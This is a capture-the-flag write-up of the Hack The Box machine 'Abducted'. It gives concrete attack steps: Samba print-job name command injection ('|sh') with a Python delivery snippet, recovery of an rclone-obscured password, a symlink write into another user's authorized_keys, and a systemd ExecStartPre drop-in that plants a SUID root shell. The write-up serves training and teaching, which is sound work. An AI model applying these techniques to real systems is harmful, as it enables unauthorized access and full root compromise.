# Abducted — Hack The Box, Linux

**TL;DR:** A guest-writable Samba printer share is vulnerable to CVE-2026-4480 —
the client-supplied print job document name (`%J`) is passed through a shell
unescaped, giving unauthenticated RCE as `nobody`. Egress is filtered to a single
port. A world-readable `rclone.conf` holds a reversibly-obscured service password
that is reused by a real user (SSH + SMB). A `transfer` share with
`wide links = yes` and `force user = marcus` turns a symlink into a cross-user
write, yielding a second account whose `operators` group can write a `smbd`
systemd drop-in and restart the (root) service — `ExecStartPre` then runs as root.

## 1. Recon

TCP: 22 (OpenSSH 9.6p1) and 139/445 (Samba 4). Anonymous SMB shows
`HP-Reception` (printer, guest-writable), `projects`, `transfer` (both
auth-gated), `IPC$`. Only local user surfaced: `scott` ("Hartley Group").

## 2. Foothold — CVE-2026-4480

`/etc/samba/shares.conf`:

```
[HP-Reception]
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

Samba drops the client-supplied **print job document name** into that command
and runs it through `system()` unescaped. The reliable delivery is the SPOOLSS
RPC document name (not `smbspool`'s title, not the smbclient filename — those do
not reach `%J`, which cost real time to discover). With
`document_name = "|sh"`, the command becomes
`/usr/local/bin/printaudit | sh <spoolfile>`, so the WritePrinter body runs as a
shell script. `EndDocPrinter` blocks until the command returns → a clean
egress-independent timing oracle.

```python
info = spoolss.DocumentInfo1(); info.document_name = "|sh"; info.datatype = "RAW"
ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = info   # set level BEFORE info
iface.StartDocPrinter(h, ctr); iface.WritePrinter(h, body, len(body)); iface.EndDocPrinter(h)
```

Two traps worth remembering:
- **Egress is filtered to a single port (8443).** ICMP/DNS/4444/80/443 callbacks
  all fail; only 8443 leaves the box. Sweep outbound ports before concluding the
  vector is dead.
- **Quoting.** Hold injected `$(...)` substitutions in a single-quoted variable
  so only the *target's* shell expands them — inlining them in a double-quoted
  string (or a heredoc that strips the backslash) makes the attack host evaluate
  them locally and fakes a success.

Shell as `nobody`.

## 3. nobody → scott (credential reuse)

`/opt/offsite-backup/rclone.conf` is world-readable:

```
[offsite]
type = sftp
user = svc-backup
pass = <rclone-obscured-blob>   # rclone-obscured, NOT encrypted
```

rclone "obscure" is AES-CTR with a static key baked into rclone — reversible
with `rclone reveal` (or 20 lines of Python) → `<svc-backup-password>`. That
password is reused by **scott** over SSH and SMB. → `user.txt`.

## 4. scott → marcus (SMB wide-links + force-user)

```
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   wide links = yes
```

scott owns `/srv/transfer`, so create a symlink there pointing at marcus's home;
the share follows it **as marcus** (force-user) and past the share root (wide
links). Write `authorized_keys` through it → SSH as marcus.

```
scott$ ln -sfn /home/marcus /srv/transfer/mh
$ smbclient //target/transfer -U scott%<pw> -c 'cd mh; mkdir .ssh; cd .ssh; put ak.pub authorized_keys'
```

marcus is in group **operators**.

## 5. marcus → root (operators-writable systemd drop-in)

`/etc/systemd/system/smbd.service.d/` is `drwxrws--- root operators`, and
`operators` may `systemctl restart smbd` (polkit). smbd runs as root, so a
drop-in `ExecStartPre=` executes as root on restart — which marcus can trigger:

```
[Service]
ExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/rbash; chmod 6755 /tmp/rbash; ..."
```

`systemctl daemon-reload && systemctl restart smbd` → SUID root shell → `root.txt`.

## Takeaways

- A group that can both **edit a root service's unit directory** and **restart
  it** is root-equivalent — a classic, quiet privesc.
- rclone-obscured passwords are plaintext-equivalent; treat any `pass =` in an
  rclone config as a cleartext secret.
- When a callback vector "doesn't work," separate three failure modes before
  abandoning it: wrong sink, blocked egress, local-vs-remote evaluation. Here all
  three bit in sequence and each masqueraded as "the exploit failed."
